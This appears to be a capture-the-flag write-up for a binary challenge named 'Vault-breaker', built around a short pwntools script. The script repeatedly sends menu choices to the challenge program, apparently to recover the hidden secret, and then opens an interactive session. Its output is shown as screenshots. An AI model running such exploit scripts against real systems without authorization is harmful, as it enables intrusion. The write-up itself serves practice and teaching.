# Vault-breaker

## CHALLENGE DESCRIPTION
#### Money maker, Big Boy Bonnie has a crew of his own to do his dirty jobs. In a tiny little planet a few lightyears away, a custom-made vault has been found by his crew. Something is hidden inside it, can you find out the way it works and bring it to Bonnie?


# ![image](https://github.com/user-attachments/assets/7ee7128e-ac04-4e1d-82aa-5a774d0cced6)

```
#ab.py
from pwn import *
import os 

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './vault-breaker'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

# exploit starts
# 0x1F == 31
for i in range(31, -1, -1):
    print('[INFO] Iter: ', i)
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', str(i))

sh.sendlineafter(b'>', b'2')

sh.interactive()
```
> Below is the output of running ab.py script.
# ![image](https://github.com/user-attachments/assets/ada66c6b-172a-4d73-972b-6d702fda0919)

# ![image](https://github.com/user-attachments/assets/e3a89554-574f-4a17-b5cf-cd40f8613ba0)
